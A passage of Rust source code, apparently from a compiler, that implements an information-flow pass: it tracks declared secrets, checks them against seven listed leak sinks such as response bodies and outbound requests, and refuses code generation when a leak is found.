//! Information flow — spec §17.3, correcting §5.3 via §14G.1.3.
//!
//! §5.3 says taint "propagates through every data dependency" and claims
//! non-interference. Those two statements are not compatible: a
//! data-dependency analysis cannot see a **control** dependency. Six
//! reviewers independently exhibited programs that exploit exactly that
//! hole, and every one of them is a fixture in this crate's tests.
//!
//! Three phases, not six: declare, summarise, discharge.
//!
//! * **Declare** reads `secret` off the declaration. Secrecy being
//!   declared rather than inferred is what removes the signal-graph
//!   fixpoint entirely — every edge into a signal is checked against a
//!   constant — and it is why §17.5.4's reactive cycles are irrelevant
//!   here rather than "handled".
//! * **Summarise** solves one fixpoint over the call graph, keyed by the
//!   instantiations the split found. Every summary has the normal form
//!   `floor ⊔ ⨆_{p ∈ deps} label(arg_p)`, which is the only shape that
//!   keeps `politeGreeting`'s unused `key` out of the result while still
//!   catching `if key is ""`.
//! * **Discharge** walks every root, including orphan roots, so no
//!   definition escapes checking.

use std::collections::{BTreeMap, BTreeSet};

use zdc_hir::{
    Builtin, DefId, DefKind, ExprId, Hir, HirArg, HirArmBody, HirElement, HirExprKind, HirMutation,
    HirNode, HirNodeArmBody, HirPathSeg, HirPipeline, HirStmt, LocalId, Res,
};
use zdc_lexer::Span;
use zdc_types::SignalPlacement;

use crate::diag::GraphError;
use crate::label::{Label, Obs, Secrecy, Sym, SymLabel};
use crate::root::{placement_of, Ctx, RootId};
use crate::sites::arg_expr;
use crate::split::{BoundaryEdge, Crossing, EndpointKind, MemberForm, TierSplit};

/// §14G.1.3(c)'s sink list, declared and closed.
///
/// Deliberately **not** `#[non_exhaustive]`: adding a variant must break
/// every downstream `match`. Adding sink 8 is: add the variant, fix the
/// compile errors, bump the length test, write `describe`, and add a
/// fixture that leaks through it and must be rejected.
///
/// # The one no obligation ever names
///
/// [`SinkSite::PlatformLog`] is never constructed. It is the only one
/// left, and the count is stated here because a sink that cannot fire and
/// a sink nobody wired look identical from outside this crate.
/// [`Sink::producer`] says the same thing as a total function, so the
/// count is *checked* rather than counted by whoever reads this.
///
/// * [`Sink::PlatformLog`] — **unconstructible**, and the reason given
///   here was false (#22). It read *"nothing in `zdc-codegen` emits a
///   call that does: the client bundle, the function bundles and the
///   runtime contain no logging call at all"*. The client half of that is
///   wrong, and wrong about emitted bytes rather than about intent:
///   `zdc-codegen` writes `reportFailure as $failed` into every handler
///   that awaits a write (`view.rs`), and `runtime/rpc.js`,
///   `runtime/dom.js` and `runtime/keys.js` each call `reportError`.
///   Build any program that increments a `durable` counter and the
///   emitted `client.js` contains the call.
///
///   What is true is narrower, and it is two facts rather than one.
///
///   **§5.3a's medium is the platform's, not the browser's.** A platform
///   log, a retry record and a redelivery record are written by the host
///   *about a server execution*; they outlive the request, they are
///   replicated to systems with other access rules, and they are read by
///   people the response was never shown to. The three calls above hand a
///   value to the visitor's own browser, and the browser is the reader
///   sinks 1, 2, 4 and 7 already exist for — a machine cannot leak to
///   itself. The half that runs where the platform is logging is the
///   **function** bundle, and that one really does contain no logging
///   call: it is `export async function handler($args) { return … }` and
///   nothing else.
///
///   **And the browser is told nothing new.** The value `$failed`
///   receives is the transport's rejection, whose `message` is the
///   endpoint's own error body (`runtime/rpc.js`'s `reason`). So it
///   arrived down the channel [`Sink::ResponseBody`] rules on, at the
///   endpoint [`Ifc::response_bodies`] obliges — the browser's error
///   channel is not an eighth medium, it is a second copy of the fourth.
///
///   **What would make it a producer**, either half of which is enough:
///   `RootOrigin::Trigger` becoming constructible — it needs an
///   `every`/`inbound` declaration, which the grammar does not have — at
///   which point [`crate::split::BoundaryEdge::TriggerFail`] has a root
///   to name and the platform's retry record has a program's value in it;
///   or any logging call emitted into a *function* bundle, which puts a
///   value somewhere the visitor cannot see and the operator's log
///   provider can. Both are pinned:
///   `the_grammar_has_no_trigger_declaration_to_root_a_platform_log` in
///   `zdc-graph`, and `nothing_emitted_writes_to_a_platform_log` in
///   `zdc-codegen` — beside
///   `every_logging_call_in_the_shipped_runtime_is_named_here`, which
///   names the three the runtime does make and why none of them is this
///   sink.
///
/// The other two that used to be here are both constructed now, and each
/// stopped being unconstructible for a different reason. Both are kept on
/// the record: this paragraph existed because `BuildArtifact` became
/// constructible once, quietly, and nothing noticed, and deleting the
/// history is how that happens a second time.
///
/// * [`Sink::BuildArtifact`] — **constructed.** Its entry here said a
///   `static` placement was what would change that, and `static` was
///   added: [`zdc_ast::Placement`] has four variants,
///   `SignalPlacement::Static` becomes `MemberForm::Inlined`, the split
///   pushes a `BoundaryEdge::BuildOutput` for every `emitting` signal, and
///   `Ifc::declarations` raises the obligation against the **computed**
///   label. `flow.rs`'s
///   `static_is_the_one_placement_that_reaches_the_build_artefact_sink`
///   counts the placements that reach it over `Placement::ALL` rather than
///   over a list written out by hand, which is what makes a fifth
///   placement a test failure instead of another silent widening.
/// * [`Sink::ResponseBody`] — **constructed.** It was described as
///   *merely unconstructed* and left to a double cover:
///   `ObligationKind::Declaration` on the signal the endpoint computes,
///   and `Sink::ClientState`/[`Sink::View`] where the browser reads the
///   result. **The cover had a hole in it that a program could reach.** A
///   command endpoint is created by a cross-region *write*, so no
///   `Crossing::Remote` read ever rules on it, and the declaration rule
///   rules on what the signal is computed from rather than on what the
///   store hands back — so a `secret durable` counter incremented from a
///   button checked clean and shipped
///   `return await $store.incr('tally', …)` to the browser. It is now
///   obliged at the endpoint itself, by `Ifc::response_bodies`, which is
///   what "genuinely checked at the return" has to mean.
///
///   **This is the other sink #22 named**, and the condition it was
///   recorded as waiting for — an FFI HIR, so that an outbound `fetch`
///   could be written down — was never the condition. A response body is
///   not something a program asks for; it is what an endpoint the *split*
///   invented returns, and the split already had every endpoint in a
///   list. So the producer is fourteen lines over `TierSplit::endpoints`
///   and owes nothing to `foreign`. Recorded because #22's own evidence
///   was a table of *pending dependencies*, and a dependency nobody
///   re-derives outlives the thing it was true about.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Sink {
    ClientState,
    View,
    BuildArtifact,
    ResponseBody,
    PlatformLog,
    LiveSync,
    OutboundRequest,
}

impl Sink {
    pub const CLOSED_LIST: [Sink; 7] = [
        Sink::ClientState,
        Sink::View,
        Sink::BuildArtifact,
        Sink::ResponseBody,
        Sink::PlatformLog,
        Sink::LiveSync,
        Sink::OutboundRequest,
    ];

    pub fn code(self) -> &'static str {
        match self {
            Sink::ClientState => "E-IFC-06",
            Sink::View => "E-IFC-05",
            Sink::BuildArtifact => "E-IFC-07",
            Sink::ResponseBody => "E-IFC-08",
            Sink::PlatformLog => "E-IFC-09",
            Sink::LiveSync => "E-IFC-10",
            Sink::OutboundRequest => "E-IFC-11",
        }
    }

    /// Why reaching it is a leak, as the diagnostic finishes the sentence.
    pub fn because(self) -> &'static str {
        match self {
            Sink::ClientState => "client state is the browser's own memory",
            Sink::View => "the view is where a browser can see it",
            Sink::BuildArtifact => "every visitor downloads the build artefact",
            Sink::ResponseBody => "a response body goes to the browser by definition",
            Sink::PlatformLog => "a log is the least guarded copy of anything",
            Sink::LiveSync => "a subscribed browser is told about it",
            // The one sink that is not about what a reader is shown. The
            // browser resolves the URL and issues the request itself, to
            // whichever host the value names, before anything is painted —
            // so an image nobody ever sees leaks exactly as well as one
            // in the middle of the page.
            Sink::OutboundRequest => "the value chooses the host it is sent to",
        }
    }

    pub fn describe(self) -> &'static str {
        match self {
            Sink::ClientState => "client state",
            Sink::View => "the view",
            Sink::BuildArtifact => "the build artefact",
            Sink::ResponseBody => "an outbound response body",
            Sink::PlatformLog => "a platform log",
            Sink::LiveSync => "a live-sync stream the browser subscribes to",
            Sink::OutboundRequest => "a request the browser sends",
        }
    }

    /// Whether any obligation site in this pass constructs this sink —
    /// §17.7's table, as a total function (#22).
    ///
    /// The table was prose, it named two sinks with no producer, and by
    /// the time anyone re-read it one of the two had acquired one and the
    /// prose had not moved. A `match` moves: adding an eighth sink is a
    /// compile error here, and a producer that is deleted fails the test
    /// that names the sink rather than a count nobody reads.
    ///
    /// **Not the same question as "can a program provoke `code()`".** A
    /// sink is [`Producer::Wired`] when the pass raises an obligation at
    /// it, which is what makes every program that reaches it ruled on.
    /// Whether the obligation can ever *fail* is a separate question with
    /// a separate answer: [`Sink::BuildArtifact`] is wired and no program
    /// can fail it, because two placement rules independently refuse
    /// every route by which a secret could reach a `static` signal
    /// (`flow.rs`'s `only_the_placement_rules_kept_a_secret_out_of_a_
    /// build_artefact`). Conflating the two is how sink 3 was left
    /// unwired while looking covered.
    pub fn producer(self) -> Producer {
        match self {
            // `Walk::read`, at the read the browser performs.
            Sink::ClientState | Sink::View => Producer::Wired,
            // `discharge_signal`, against the computed label of an
            // `emitting static` signal.
            Sink::BuildArtifact => Producer::Wired,
            // `Ifc::response_bodies`, over `TierSplit::endpoints`.
            Sink::ResponseBody => Producer::Wired,
            // `Ifc::live_sync`, over the split's two boundary edges.
            Sink::LiveSync => Producer::Wired,
            // `Walk`'s URL-bearing attribute and `request` argument.
            Sink::OutboundRequest => Producer::Wired,
            Sink::PlatformLog => Producer::Awaiting(
                "an `every`/`inbound` trigger declaration, which would give \
                 `RootOrigin::Trigger` a root for `BoundaryEdge::TriggerFail` to name — or any \
                 logging call emitted into a function bundle, which is the half of the output \
                 that runs where the platform is writing the log",
            ),
        }
    }
}

/// Whether a [`Sink`] has an obligation site, and what it is waiting for
/// when it has none.
///
/// Deliberately carries the condition rather than a bare `bool`. A sink
/// with no producer is not by itself a defect — it may be a medium
/// nothing in the language can reach yet — but *"no producer"* and *"no
/// producer, and here is what changes that"* are different claims, and
/// only the second one survives being read a year later by somebody
/// adding the missing construct.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Producer {
    /// Some site in this pass raises an obligation naming this sink, so
    /// every program that reaches it is ruled on.
    Wired,
    /// No site does. The sentence is the condition under which one has to
    /// exist, and it is a sentence rather than a flag because the flag is
    /// what a reader would have believed without checking.
    Awaiting(&'static str),
}

/// Where a sink is, precisely enough for an emitter to ask about it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum SinkSite {
    ViewArg(ExprId, Ctx),
    ClientSignal(DefId),
    BuildOutput(DefId),
    ResponseBody(RootId),
    PlatformLog(RootId),
    LiveSync(DefId),
    /// One URL-bearing argument at one element, in one context.
    ///
    /// The expression is what distinguishes two instances of the same
    /// component: instantiation copies a body per call site and keeps its
    /// spans, so the span alone is not an identity. The obligation key is
    /// `(Span, ObligationKind)` and `ObligationKind::Escape` carries this,
    /// so `Image source is publicLogo` in one instance cannot discharge
    /// `Image source is apiKey` in another.
    UrlArgument(ExprId, Ctx),
    /// One argument of one `request` declaration, in one context (#19).
    ///
    /// A separate *site* and the same [`Sink::OutboundRequest`], because
    /// the medium is the same one: an HTTP request leaves the browser
    /// carrying the value to a host the program named. What differs is the
    /// mechanism — an attribute the browser dereferences versus a `fetch`
    /// the runtime issues — and a mechanism is not a medium. Folding the
    /// two sites into one variant would instead lose the thing a site is
    /// for: `search with term is a, page is b` must be two obligations, or
    /// repairing one argument discharges the other.
    RequestArgument(ExprId, Ctx),
}

/// A position whose value becomes a URL the browser fetches.
///
/// Two members and one sink. Both are [`Sink::OutboundRequest`], because
/// the medium is the same — an HTTP request leaves the browser carrying
/// the value to a host the program named — and they differ only in the
/// mechanism that issues it. The variant decides which [`SinkSite`] the
/// obligation is keyed on, so two positions cannot discharge each other.
#[derive(Debug, Clone, PartialEq, Eq)]
enum UrlPosition {
    /// A named argument of a view element that the browser dereferences,
    /// such as `Image source is …` (`zdc_hir::URL_ATTRIBUTES`).
    Attribute { expr: ExprId, argument: String },
    /// A `request` declaration's argument, which is appended to the
    /// destination as a query parameter (#19).
    RequestArgument {
        expr: ExprId,
        argument: String,
        destination: String,
    },
}

/// Permission to emit.
///
/// Unforgeable outside this crate: the field is private and there is no
/// public constructor, so the only way to obtain one is to ask a
/// [`Verdict`] for it. `zdc_codegen::Inputs` has one as a field, and
/// `zdc_codegen::compile` takes an `Inputs`, so a caller that has not
/// asked cannot call it — the guarantee is a Rust type error rather than
/// a comment about one.
///
/// **What it does and does not prove.** [`Verdict::clearance`] hands one
/// out exactly when the flow pass found no error, so holding a `Cleared`
/// proves *some* verdict was clean. It does not prove it was the verdict
/// being passed alongside it, and it says nothing about the split, so
/// `compile` re-checks both — for the same reason E-IFC-01 exists, that
/// two passes reading the same fact must not silently disagree.
///
/// [`Verdict::cleared`] answers the narrower per-site question, and that
/// one is **not** load-bearing yet: `cleared` returns `None` both for a
/// site the pass rejected and for a site it never examined, so an emitter
/// that demanded one at every write would refuse every program. Making
/// the per-site token enforceable means first making clearance total over
/// the sites emission actually writes, which is a change to the pass and
/// not to its callers. Concretely, a clearance is recorded for two sinks
/// only — `BuildArtifact` in `discharge_signal` and `LiveSync` in
/// `boundary` — so an emitter that demanded one at every site would
/// refuse programs this pass accepts.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Cleared(());

/// What the information-flow pass concluded.
#[derive(Debug, Clone, Default)]
pub struct Verdict {
    labels: BTreeMap<DefId, Label>,
    cleared: BTreeSet<(Sink, SinkSite)>,
    pub diagnostics: Vec<GraphError>,
}

impl Verdict {
    /// The label a definition ended up with. §16.3.12 assertion B ranges
    /// over this, not over "is not declared `secret`" — the keyword-based
    /// check is vacuous under a stopped walk, and this one is not.
    pub fn label(&self, def: DefId) -> Label {
        self.labels.get(&def).copied().unwrap_or_default()
    }

    pub fn errors(&self) -> impl Iterator<Item = &GraphError> {
        self.diagnostics.iter().filter(|d| d.is_error())
    }

    pub fn has_errors(&self) -> bool {
        self.errors().next().is_some()
    }

    /// Permission to emit this program at all. `None` is a refusal, and a
    /// caller has nothing else it can do with it: `zdc_codegen::Inputs`
    /// cannot be built without one.
    pub fn clearance(&self) -> Option<Cleared> {
        (!self.has_errors()).then_some(Cleared(()))
    }

    /// Ask whether a site may be written into. `None` is a refusal *or* a
    /// site the pass never examined; see [`Cleared`] for why that
    /// ambiguity is what keeps this query out of the emitter's path.
    pub fn cleared(&self, sink: Sink, site: SinkSite) -> Option<Cleared> {
        self.cleared.contains(&(sink, site)).then_some(Cleared(()))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum ObligationKind {
    /// A write into a place with a declared label.
    Write(DefId),
    /// A signal's declared label versus what its initialiser produced.
    Declaration(DefId),
    /// A value reaching one of the seven sinks.
    Escape(Sink, SinkSite),
    /// A value passed to a parameter of a `foreign … is client`
    /// (§14E.3 row 1) — the definition, and which parameter.
    ///
    /// Deliberately **not** an eighth `Sink`. The seven are places a value
    /// is *observed* — a screen, a log, a response body — and each names a
    /// medium the reader can reason about. A client foreign is not a
    /// medium: it is arbitrary JavaScript in the browser, and what it does
    /// with a secret is unknowable rather than merely bad. Folding it in
    /// would also mean `Sink::CLOSED_LIST` no longer answered "what are
    /// the ways a value becomes visible", which is the question that list
    /// exists to answer exhaustively.
    ///
    /// Carrying the parameter index rather than only the definition is
    /// what keeps two arguments of one call two obligations: `plot(apiKey,
    /// userName)` should not have its second argument discharged by its
    /// first being repaired.
    ForeignArgument(DefId, u32),
}

#[derive(Debug, Clone)]
struct Obligation {
    kind: ObligationKind,
    required: Secrecy,
    found: Sym,
    pc: Sym,
    site: Span,
    /// What the reader is told the value *is*, in prose.
    what: String,
    found_trace: Trace,
    pc_trace: Trace,
}

type Trace = Vec<(Span, String)>;

/// What identifies an obligation, and therefore what gets joined with what.
///
/// The span alone is not an identity any more. Instantiation copies a
/// component's body once per call site and keeps the spans, so one
/// `write` inside `VoteCard` is two obligations sharing a span — and
/// because a parameter reference *becomes* the caller's expression, the
/// two can name different places with different declared labels. Keyed on
/// the span alone, `oblige_at` joins them: the first one inserted keeps
/// its `required` and its `kind`, and the second's `found` is folded into
/// it. A secret written into a `secret`-declared place in one instance
/// would then discharge the obligation for a `public` place in the other,
/// and the leak is emitted with no diagnostic.
///
/// The kind carries the place written, the signal declared, or the sink
/// and site reached, so adding it to the key separates exactly the
/// obligations that differ while still joining the genuinely repeated
/// ones — which is what keeps a summary bounded by sites rather than by
/// rounds, and so keeps the fixpoint terminating.
type ObligationId = (Span, ObligationKind);

#[derive(Debug, Clone, Default)]
struct Summary {
    result: SymLabel,
    obligations: BTreeMap<ObligationId, Obligation>,
}

/// A label with the reason it is what it is.
///
/// The reason lives **outside** the lattice and outside every equality
/// test: `Sym` derives `PartialEq` over exactly the lattice the
/// termination proof ranges over, and a witness inside it would grow two
/// steps every round forever (verified against `recurse.zd`).
#[derive(Debug, Clone, Default)]
#[must_use = "a walked expression's label is a security obligation; dropping it is how a leak gets past the flow pass"]
struct Valued {
    label: SymLabel,
    trace: Trace,
}

impl Valued {
    fn bottom() -> Valued {
        Valued::default()
    }

    fn of(label: SymLabel, trace: Trace) -> Valued {
        Valued { label, trace }
    }

    fn join(&self, other: &Valued) -> Valued {
        Valued {
            label: self.label.join(&other.label),
            trace: merge(&self.trace, &other.trace),
        }
    }
}

fn merge(left: &Trace, right: &Trace) -> Trace {
    let mut out = left.clone();
    for step in right {
        if !out.iter().any(|(span, _)| *span == step.0) {
            out.push(step.clone());
        }
    }
    out
}

/// Run the information-flow pass.
///
/// It needs nothing from `zdc-types` in the language as it stands: there
/// is no `foreign` declaration to read a `gives secret` flag off, and
/// §17.6 item 13 blesses matching `Remote`'s three tags by name. So this
/// runs whether or not the program typechecks, which is what lets a
/// program with a type error *and* a leak report both.
pub fn ifc(hir: &Hir, split: &TierSplit) -> Verdict {
    Ifc::new(hir, split).run()
}

struct Ifc<'a> {
    hir: &'a Hir,
    split: &'a TierSplit,
    declared: BTreeMap<DefId, Label>,
    summaries: BTreeMap<(DefId, Ctx), Summary>,
    /// How parameter `i` of `(f, ctx)` reaches `f`'s result, reconstructed
    /// after convergence.
    param_paths: BTreeMap<(DefId, Ctx, u32), Trace>,
    out: Verdict,
}

impl<'a> Ifc<'a> {
    fn new(hir: &'a Hir, split: &'a TierSplit) -> Ifc<'a> {
        Ifc {
            hir,
            split,
            declared: BTreeMap::new(),
            summaries: BTreeMap::new(),
            param_paths: BTreeMap::new(),
            out: Verdict::default(),
        }
    }

    fn run(mut self) -> Verdict {
        self.declare();
        self.summarise();
        if self.a_secret_exists() {
            self.reconstruct_param_paths();
        }
        self.discharge();
        self.live_sync();
        self.response_bodies();
        // §18.1's second lattice, on the pass that exists (§21.6 item 2).
        // §17.1.2 gives the `ifc` stage one `Verdict`, and codegen's third
        // refusal already reads `Verdict.errors`, so the integrity
        // direction gates code generation by the same rule the
        // confidentiality direction does rather than by a second one.
        //
        // **The rules, not the claim** (§21.6 item 18, third amendment).
        // Nothing here promises robustness; every diagnostic states what
        // its rule requires and stops.
        self.out
            .diagnostics
            .extend(crate::authority::authority(self.hir, self.split).into_diagnostics());
        self.out
    }

    /// §14G.1.3(c)'s sink 4, ruled on where the artefact actually is.
    ///
    /// Every emitted endpoint ends in `return <value>` and that value
    /// crosses the wire (`zdc_codegen::server`). This used to be left to a
    /// double cover — the signal's own `Declaration` obligation, and
    /// `Walk::read`'s obligation where the browser reads the result — and
    /// the cover has a hole in it that a program can reach today.
    ///
    /// A **command** endpoint is created by a cross-region *write*
    /// (`MutCrossing::Command`), not by a read, so no `Crossing::Remote`
    /// ever rules on it; and `Declaration` rules on what the signal is
    /// computed *from*, not on what the store hands back. So
    ///
    /// ```text
    /// secret state tally is durable Whole starting 0
    /// view
    ///     Button "go"
    ///         on click
    ///             add 1 to tally
    /// ```
    ///
    /// checked clean and emitted `return await $store.incr('tally', ...)`,
    /// which puts the new value of a secret in the response body. That is
    /// this sink, exactly, and nothing was watching it — which is what
    /// makes a sink that cannot fire indistinguishable from a sink that is
    /// not there.
    ///
    /// Ruled on for both endpoint kinds rather than only the uncovered
    /// one. Naming the covered case is what keeps the reasoning honest if
    /// the other cover ever moves, and it costs a second diagnostic only
    /// on a program that is already refused.
    fn response_bodies(&mut self) {
        let obligations: Vec<(RootId, DefId, &'static str)> = self
            .split
            .endpoints
            .iter()
            .map(|endpoint| match &endpoint.kind {
                // The handler recomputes the signal and returns it.
                EndpointKind::Value(def) => (endpoint.root, *def, "computed and sent back"),
                // The handler performs the write and returns whatever the
                // store answers about the key it wrote.
                EndpointKind::Command(key) => {
                    (endpoint.root, key.signal, "what the store answers about")
                }
            })
            .collect();

        for (root, def, why) in obligations {
            let label = self.declared.get(&def).copied().unwrap_or_default();
            let name = self.hir.defs[def].name.clone();
            let span = self.hir.defs[def].span;
            self.discharge_all(BTreeMap::from([(
                (
                    span,
                    ObligationKind::Escape(Sink::ResponseBody, SinkSite::ResponseBody(root)),
                ),
                Obligation {
                    kind: ObligationKind::Escape(Sink::ResponseBody, SinkSite::ResponseBody(root)),
                    required: Secrecy::Public,
                    found: Sym::floor(label.value),
                    pc: Sym::bottom(),
                    site: span,
                    what: format!("`{name}`, {why} by this endpoint,"),
                    found_trace: vec![(span, format!("`{name}` is declared secret"))],
                    pc_trace: Vec::new(),
                },
            )]));
        }
    }

    // --- phase 1: declare (§17.3.3) ---

    fn declare(&mut self) {
        for (id, def) in self.hir.defs.iter() {
            let DefKind::Signal(signal) = &def.kind else {
                continue;
            };
            let label = if signal.secret {
                // `secret` labels both components Secret: §5.3's lattice
                // is two-point and the grammar has no syntax to declare a
                // public-shaped secret-valued store.
                Label::scalar(Secrecy::Secret)
            } else {
                Label::scalar(Secrecy::Public)
            };
            self.declared.insert(id, label);
            self.out.labels.insert(id, label);

            // E-IFC-01 is a redundant assertion, with its own code,
            // because two passes reading the same keyword must not
            // silently disagree. It is raised only when the split did not
            // already raise E0313, so one mistake is never printed twice.
            let placement = placement_of(signal.placement);
            let cannot_hold = !placement.may_be_secret();
            let split_said_so = self
                .split
                .diagnostics
                .iter()
                .any(|d| d.code == "E0313" && d.span == def.span);
            if signal.secret && cannot_hold && !split_said_so {
                self.out.diagnostics.push(GraphError::new(
                    "E-IFC-01",
                    format!(
                        "`{}` is declared `secret` on a `{}` placement, which cannot hold one.",
                        def.name,
                        placement.describe()
                    ),
                    def.span,
                ));
            }
        }
    }

    // --- phase 2: summarise (§17.3.4) ---

    fn summarise(&mut self) {
        let keys: Vec<(DefId, Ctx)> = self
            .split
            .contexts
            .iter()
            .filter(|(id, _)| matches!(self.hir.defs[**id].kind, DefKind::Function(_)))
            .flat_map(|(id, contexts)| contexts.iter().map(move |ctx| (*id, *ctx)))
            .collect();

        for key in &keys {
            self.summaries.insert(*key, Summary::default());
        }

        // A monotone fixpoint over a finite lattice: seeding at ⊥ gives
        // the least fixed point, which is sound for a may-analysis. The
        // bound is stated rather than trusted — a non-terminating loop
        // here would be a compiler hang, which is the one failure mode a
        // language server cannot survive.
        let bound = 8 * (keys.len() + 1) * (self.hir.exprs.len() + 1);
        for _ in 0..bound {
            let mut changed = false;
            for (def, ctx) in &keys {
                let solved = self.solve_function(*def, *ctx, false, 0);
                let before = self.summaries.get(&(*def, *ctx));
                if before.map(|s| &s.result) != Some(&solved.result)
                    || before.map(|s| s.obligations.len()) != Some(solved.obligations.len())
                    || !obligations_equal(before, &solved)
                {
                    self.summaries.insert((*def, *ctx), solved);
                    changed = true;
                }
            }
            if !changed {
                return;
            }
        }
    }

    fn solve_function(&self, def: DefId, ctx: Ctx, tracing: bool, depth: u32) -> Summary {
        let DefKind::Function(function) = &self.hir.defs[def].kind else {
            return Summary::default();
        };
        let mut walk = Walk::new(self, ctx, def, tracing, depth);
        for (index, param) in function.params.iter().enumerate() {
            walk.locals.insert(
                *param,
                Valued::of(
                    SymLabel {
                        shape: Sym::dep(index as u32, Obs::Shape),
                        value: Sym::dep(index as u32, Obs::Value),
                        failure: Sym::dep(index as u32, Obs::Failure),
                    },
                    Vec::new(),
                ),
            );
        }
        walk.block(function.body);
        // Both, joined — never one instead of the other.
        //
        // `Walk::block` folds the accumulator into the result at the end of
        // every run of pipeline clauses, because that is where
        // `zdc-codegen` emits `return $p`. Reading `walk.acc` only when
        // nothing gave was the same defect as the `show` arm: a body with
        // both a `give` and a pipeline compiles to two returns, and the
        // pipeline's label was discarded because `gave` was true.
        let result = walk.result.label.join(&walk.acc.label);
        Summary {
            result,
            obligations: walk.obligations,
        }
    }

    /// Whether anything in this program can be secret at all.
    ///
    /// Two constructs make a value secret without being handed one: a
    /// `secret` declaration, which `declare` has already recorded, and
    /// `environment`, which is secret whether or not anybody said so
    /// (§5.6). Every other secret in the pass is one of those two joined
    /// onto something, so a program with neither has no concretely secret
    /// value anywhere and nothing for a witness to describe.
    ///
    /// **This is the reader's own premise, hoisted.** `Walk::witness_for`
    /// returns before it consults a parameter path unless the argument in
    /// hand is concretely secret, so on a program with no secret the
    /// reconstruction below is computed in full and read zero times. It is
    /// not a second, weaker flow analysis and it decides no verdict: the
    /// obligations, the diagnostics and the clearance are whatever the
    /// pass makes of them either way. It decides only whether the
    /// explanations are built.
    ///
    /// What it is worth: the prelude is 150-odd functions compiled with
    /// every program (§17.4.1), none of them mentioning a secret, and the
    /// language server runs this pass on every keystroke.
    fn a_secret_exists(&self) -> bool {
        self.declared.values().any(|label| {
            Obs::ALL
                .iter()
                .any(|obs| label.get(*obs) == Secrecy::Secret)
        }) || self
            .hir
            .exprs
            .iter()
            .any(|(_, expr)| matches!(expr.kind, HirExprKind::Environment(_)))
    }

    /// §17.3.4's witness reconstruction, done **after** convergence.
    ///
    /// One concrete re-walk per parameter, with that parameter marked
    /// Secret and everything else Public, recording the path its taint
    /// takes to the result. Breadth is unnecessary: the walk is over a
    /// tree, so the path it records is the only one.
    ///
    /// Run only where [`Ifc::a_secret_exists`] says a witness could ever
    /// be asked for. Each re-walk is a *traced* walk, and a traced walk
    /// re-solves every callee three levels deep, so this is the most
    /// expensive phase in the pass by an order of magnitude and the one
    /// with nothing to show for it on the programs people mostly edit.
    fn reconstruct_param_paths(&mut self) {
        let keys: Vec<(DefId, Ctx)> = self.summaries.keys().copied().collect();
        for (def, ctx) in keys {
            let DefKind::Function(function) = &self.hir.defs[def].kind else {
                continue;
            };
            let arity = function.params.len();
            let params = function.params.clone();
            for index in 0..arity {
                let mut walk = Walk::new(self, ctx, def, true, 0);
                for (position, param) in params.iter().enumerate() {
                    let secrecy = if position == index {
                        Secrecy::Secret
                    } else {
                        Secrecy::Public
                    };
                    walk.locals.insert(
                        *param,
                        Valued::of(SymLabel::declared(Label::scalar(secrecy)), Vec::new()),
                    );
                }
                walk.block(function.body);
                let result = walk.result.join(&walk.acc);
                if result.label.value.concrete() == Secrecy::Secret {
                    self.param_paths
                        .insert((def, ctx, index as u32), result.trace);
                }
            }
        }
    }

    // --- phase 3: discharge (§17.3.6) ---

    fn discharge(&mut self) {
        // Every root, including orphan roots, so no definition escapes
        // checking (§17.2.5 fatal 6 and §17.3.6 together).
        let roots: Vec<(RootId, Ctx)> = self
            .split
            .roots
            .iter()
            .enumerate()
            .map(|(index, root)| (RootId(index as u32), root.ctx))
            .collect();

        for (root, ctx) in roots {
            let members: Vec<(DefId, MemberForm)> = self.split.members_of(root).collect();
            for (def, form) in members {
                match (&self.hir.defs[def].kind, form) {
                    // `Inlined` is a `static` signal, and it is a member in
                    // this form in **every** root it appears in — so a
                    // guard of `form == Binding` alone meant no `static`
                    // initialiser was ever walked by this pass. The walk
                    // is what raises sink 3 for an `emitting` signal.
                    // `Test` is here with the other two on purpose. A
                    // test's expectation is an ordinary expression in the
                    // build root, so it reads what any build-root
                    // expression reads and it is checked by the same rules
                    // — a claim about a `secret` is a claim that reads a
                    // secret, and this pass is what says so (issue #169).
                    // The alternative, exempting tests, would make the one
                    // construct in the language that nobody looks at the
                    // one place a leak could hide.
                    (
                        DefKind::Signal(_),
                        MemberForm::Binding | MemberForm::Inlined | MemberForm::Test,
                    ) => self.discharge_signal(def, ctx),
                    // A durable key read back from the store here — the
                    // key's own declared label, already ruled on by
                    // `live_sync`. Its initialiser lives in BUILD, where it
                    // has `Binding` form and is discharged above; walking
                    // it again here would report one mistake twice.
                    (DefKind::Signal(_), MemberForm::StoreRead) => {}
                    (DefKind::Signal(_), MemberForm::Function | MemberForm::View) => {
                        unreachable!("`form_of` gives a signal one of the other three forms")
                    }
                    (DefKind::View(view), _) => {
                        let nodes = view.nodes.clone();
                        let mut walk = Walk::new(self, ctx, def, true, 0);
                        walk.nodes(&nodes);
                        let obligations = std::mem::take(&mut walk.obligations);
                        let errors = std::mem::take(&mut walk.errors);
                        self.discharge_all(obligations);
                        self.report_all(errors);
                    }
                    // A function is discharged at its call sites, with the
                    // arguments substituted, and once more below if
                    // nothing calls it — discharging it here as well would
                    // report the same obligation twice with its parameters
                    // still symbolic. A `release` is a function to this
                    // pass for the same reason `form_of` gives it
                    // `MemberForm::Function`: what makes it a release is
                    // checked elsewhere, not emitted.
                    (DefKind::Function(_) | DefKind::Release(_), _) => {}
                    // A `record` and a `choice` declare a type. Neither has
                    // a body, so neither reaches an expression.
                    (DefKind::Record(_) | DefKind::Choice(_), _) => {}
                    // A `component` has a body and it is deliberately not
                    // walked here: instantiation already copied it into the
                    // view once per call site, as `HirNode::Scope`, with
                    // the caller's expressions substituted for its
                    // parameters (§14D.3). The copies are what emission
                    // prints, so the copies are what is checked; walking
                    // the declaration too would rule on a context no
                    // instance is in.
                    (DefKind::Component(_), _) => {}
                    // A `foreign` names a symbol in a module the runtime
                    // provides. It has no ZDeceptron body — it is emitted
                    // inline at each call site — so there is no expression
                    // to walk and nothing here to discharge (§17.4.7).
                    (DefKind::Foreign(_), _) => {}
                }
            }
        }

        // A function nothing calls still has its obligations discharged,
        // with its parameters at ⊥: an `append apiKey to auditLog` in an
        // uncalled helper is still a leak waiting to be enabled.
        for (id, def) in self.hir.defs.iter() {
